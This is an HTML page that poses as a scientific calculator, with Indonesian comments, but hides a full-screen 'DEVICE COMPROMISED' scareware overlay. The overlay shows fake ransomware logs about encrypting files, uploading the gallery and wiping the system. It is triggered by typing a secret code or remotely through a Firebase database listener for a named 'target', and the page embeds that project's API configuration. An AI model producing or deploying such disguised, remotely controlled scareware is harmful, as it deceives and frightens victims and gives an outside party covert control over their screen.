<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Scientific Calculator</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
        body { background: #121212; display: flex; flex-direction: column; height: 100vh; justify-content: flex-end; }

        /* Tampilan Layar Kalkulator */
        .screen {
            padding: 20px;
            text-align: right;
            color: #fff;
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
            background: #121212;
        }
        #upper { font-size: 1rem; color: #888; min-height: 1.2rem; }
        #lower { font-size: 3.5rem; font-weight: 300; overflow: hidden; }

        /* Grid Tombol Scientific */
        .keypad {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 8px;
            padding: 15px;
            background: #000;
            border-top-left-radius: 20px;
            border-top-right-radius: 20px;
        }
        button {
            height: 50px;
            border-radius: 25px;
            border: none;
            font-size: 0.9rem;
            cursor: pointer;
            transition: 0.1s;
            background: #222;
            color: #eee;
        }
        .btn-num { background: #333; font-size: 1.2rem; }
        .btn-op { background: #444; color: #ff6b6b; font-size: 1.3rem; }
        .btn-sci { background: #1a1a1a; color: #999; font-size: 0.75rem; }
        .btn-eq { background: #ff6b6b; color: #fff; grid-row: span 2; height: 108px; }
        button:active { filter: brightness(1.5); transform: scale(0.95); }

        /* OVERLAY HORROR (SISI GELAP) */
        #lock-screen {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #000;
            z-index: 99999;
            text-align: center;
            color: #f00;
            padding-top: 10vh;
            font-family: 'Courier New', monospace;
        }
        .skull { font-size: 80px; text-shadow: 0 0 20px #f00; animation: shake 0.1s infinite; }
        .msg { font-size: 1.2rem; margin: 20px; letter-spacing: 2px; }
        .log { text-align: left; font-size: 0.7rem; color: #500; margin: 20px; line-height: 1.5; }
        
        @keyframes shake {
            0% { transform: translate(1px, 1px); }
            50% { transform: translate(-1px, -1px); }
            100% { transform: translate(1px, -1px); }
        }
    </style>
</head>
<body>

<div class="screen">
    <div id="upper"></div>
    <div id="lower">0</div>
</div>

<div class="keypad">
    <button class="btn-sci">2nd</button>
    <button class="btn-sci">(</button>
    <button class="btn-sci">)</button>
    <button class="btn-sci">10x</button>
    <button class="btn-sci">mc</button>
    <button class="btn-sci">1/x</button>
    <button class="btn-sci">x²</button>
    <button class="btn-sci">x³</button>
    <button class="btn-sci">xy</button>
    <button class="btn-sci">m+</button>
    <button class="btn-sci">x!</button>
    <button class="btn-sci">√</button>
    <button class="btn-sci">³√</button>
    <button class="btn-sci">log</button>
    <button class="btn-sci">m-</button>
    <button class="btn-sci" onclick="sci('sin')">sin</button>
    <button class="btn-sci">cos</button>
    <button class="btn-sci">tan</button>
    <button class="btn-sci">ln</button>
    <button class="btn-sci">mr</button>
    <button class="btn-sci">sinh</button>
    <button class="btn-op" onclick="clr()">AC</button>
    <button class="btn-op" onclick="del()">⌫</button>
    <button class="btn-op" onclick="add('/')">÷</button>
    <button class="btn-op" onclick="add('*')">×</button>
    <button class="btn-sci">cosh</button>
    <button class="btn-num" onclick="add('7')">7</button>
    <button class="btn-num" onclick="add('8')">8</button>
    <button class="btn-num" onclick="add('9')">9</button>
    <button class="btn-op" onclick="add('-')">-</button>
    <button class="btn-sci">tanh</button>
    <button class="btn-num" onclick="add('4')">4</button>
    <button class="btn-num" onclick="add('5')">5</button>
    <button class="btn-num" onclick="add('6')">6</button>
    <button class="btn-op" onclick="add('+')">+</button>
    <button class="btn-sci">π</button>
    <button class="btn-num" onclick="add('1')">1</button>
    <button class="btn-num" onclick="add('2')">2</button>
    <button class="btn-num" onclick="add('3')">3</button>
    <button class="btn-eq" onclick="calculate()">=</button>
    <button class="btn-sci">Rand</button>
    <button class="btn-sci">EE</button>
    <button class="btn-num" onclick="add('0')">0</button>
    <button class="btn-num" onclick="add('.')">,</button>
</div>

<div id="lock-screen">
    <div class="skull">💀</div>
    <div class="msg">DEVICE COMPROMISED</div>
    <div class="log">
        > ACCESS_LEVEL: ROOT<br>
        > ENCRYPTING_FILES... 87%<br>
        > UPLOADING_GALLERY... DONE<br>
        > WIPING_SYSTEM_PARTITION...
    </div>
    <div style="font-size: 0.8rem; color: #fff;">AUTO-WIPE IN 04:59</div>
</div>

<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
<script>
    const firebaseConfig = {
        apiKey: "AIzaSyAS9ZCVt6iFXY8Ksd0o5z7fjXg3qi8rfhU",
        authDomain: "remote-control-9bf2c.firebaseapp.com",
        databaseURL: "https://remote-control-9bf2c-default-rtdb.asia-southeast1.firebasedatabase.app",
        projectId: "remote-control-9bf2c",
        storageBucket: "remote-control-9bf2c.firebasestorage.app",
        messagingSenderId: "71798344189",
        appId: "1:71798344189:web:6cdb414c1eab16c6b9b194"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const myId = "Target_User_1";

    let exp = "";
    const lower = document.getElementById('lower');
    const upper = document.getElementById('upper');

    function add(v) { 
        if(lower.innerText === "0") lower.innerText = "";
        exp += v; lower.innerText = exp; 
    }
    function clr() { exp = ""; lower.innerText = "0"; upper.innerText = ""; }
    function del() { exp = exp.slice(0, -1); lower.innerText = exp || "0"; }
    function calculate() {
        try {
            // JIKA KORBAN KETIK KODE RAHASIA
            if(exp === "1945") { activateLock(); return; }
            upper.innerText = exp + " =";
            let res = eval(exp);
            lower.innerText = res;
            exp = res.toString();
        } catch { lower.innerText = "Error"; exp = ""; }
    }

    // LISTENER DARI MASTER
    db.ref('targets/' + myId + '/command').on('value', (snap) => {
        const cmd = snap.val();
        if(cmd && cmd.action === 'lock') activateLock();
        if(cmd && cmd.action === 'unlock') document.getElementById('lock-screen').style.display = 'none';
    });

    function activateLock() {
        document.getElementById('lock-screen').style.display = 'block';
    }
</script>
</body>
</html>
